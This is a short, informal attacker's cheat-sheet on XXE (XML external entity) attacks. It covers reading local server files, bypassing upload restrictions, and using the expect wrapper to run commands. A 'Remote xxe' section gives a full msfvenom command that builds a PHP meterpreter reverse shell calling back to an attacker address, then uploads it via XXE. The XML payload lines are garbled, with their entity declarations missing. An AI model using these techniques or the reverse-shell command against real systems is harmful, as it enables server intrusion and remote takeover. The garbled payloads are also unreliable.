XXE
we canot use whitespaces in this attack so either we can use the $IFS command instead of a space
THis is used to read local files on server

Either place this payload in burp suite content portion if the request is dealing with xml or we can also upload a xml file with this payload and get to execute this. We may need to bypass upload restrictions because xml files are not generally allowed. The variable names starting & sign in website indicates xml and xml parsing so we can perform a xxe attack

<!- - ?xml version="1.0" ?- ->
]> &ent;

we can also try different payloads

WE can also use the above command and replace file with expect command

Remote xxe
we can use this to upload a shell to server
instead of .php shell we should make .txt shell with msfvenom because these attacks sometimes run the php shell on our machine

    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt

<!- - ?xml version="1.0" ?- ->
]> &ent;
